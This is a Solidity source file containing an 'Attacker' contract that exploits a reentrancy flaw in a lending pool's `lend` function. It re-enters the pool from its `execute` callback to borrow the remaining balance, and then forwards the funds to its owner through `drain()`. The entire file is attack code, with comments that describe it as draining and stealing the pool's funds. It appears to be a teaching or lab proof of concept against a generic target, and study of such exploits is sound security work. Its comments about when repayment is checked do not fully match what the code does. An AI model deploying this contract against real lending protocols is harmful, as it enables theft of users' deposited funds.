// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.20;

/**
 * @title IVulnerablePool
 * @dev Interface for the vulnerable contract.
 * The vulnerability exists in the `lend` function, which makes an external call
 * to the borrower's `execute` function before checking for loan repayment.
 */
interface IVulnerablePool {
    function lend(address borrower, uint256 amount) external;
    function deposit() external payable;
}

/**
 * @title Attacker
 * @dev This contract exploits a reentrancy vulnerability in a lending pool.
 *
 * Attack Steps:
 * 1. The attacker calls `attack()`, which in turn calls the vulnerable `lend` function
 *    on the target contract, requesting a loan.
 * 2. The `VulnerablePool` contract sends the requested Ether to this `Attacker` contract.
 * 3. The `VulnerablePool` then calls the `execute()` function on this `Attacker` contract.
 * 4. Inside `execute()`, the `Attacker` contract re-enters the `VulnerablePool` by calling
 *    its `lend` function again, before the first `lend` call has finished.
 * 5. This process allows the attacker to drain the `VulnerablePool` contract of its funds,
 *    as the repayment check in `lend` is performed after the external call to `execute`.
 */
contract Attacker {
    IVulnerablePool public immutable target;
    bool private hasBeenCalled;
    address public immutable owner;

    /// @param _target The address of the vulnerable lending pool contract.
    constructor(address _target) {
        target = IVulnerablePool(_target);
        owner = msg.sender;
    }

    /// @dev Fallback function to receive Ether from the vulnerable contract.
    receive() external payable {}

    /**
     * @dev Step 1: Starts the attack.
     * The attacker (owner) calls this function to initiate the reentrancy attack.
     * It requests an initial loan from the target contract.
     * @param amount The amount of Ether to borrow in the first call.
     */
    function attack(uint256 amount) external {
        require(msg.sender == owner, "Only owner can attack");
        target.lend(address(this), amount);
    }

    /**
     * @dev Step 2: The re-entry point.
     * The vulnerable contract calls this function as part of its `lend` logic.
     * This function re-enters the target contract by calling `lend` again,
     * exploiting the fact that the state checks in the target are performed
     * after this external call.
     */
    function execute() external {
        if (!hasBeenCalled) {
            hasBeenCalled = true;
            // The pool's balance is now lower, but we can still borrow what's left.
            // We re-enter the `lend` function to take another loan before the
            // first one is marked for repayment.
            uint256 remainingBalance = address(target).balance;
            if (remainingBalance > 0) {
                target.lend(address(this), remainingBalance);
            }
        }
    }

    /// @dev Allows the owner to withdraw the funds stolen from the target contract.
    function drain() external {
        require(msg.sender == owner, "Only owner can drain funds");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Failed to send Ether");
    }

    /// @dev Helper function to check the balance of this contract.
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}